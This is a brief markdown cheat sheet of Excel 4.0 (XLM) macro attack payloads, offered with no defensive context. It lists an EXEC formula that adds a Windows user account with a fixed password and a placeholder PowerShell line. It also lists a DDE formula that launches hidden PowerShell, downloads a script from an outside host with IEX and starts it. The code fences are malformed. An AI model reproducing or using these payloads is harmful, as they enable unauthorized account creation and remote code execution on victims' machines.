# XML MACRO Attack

XML 4.0 

### payload XML  4.0 attack

```
=EXEC("cmd /c net user /add nooranet12 Aa123456")
=HALT()
```

```
=EXEC("cmd /c powershell payload powershell")
=HALT()
```

```powershell
```
=cmd|'/c powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString(\"http://nooranetred.com/screen.cmd\");start-process screen.cmd'!_xlbgnm.A1
```
```





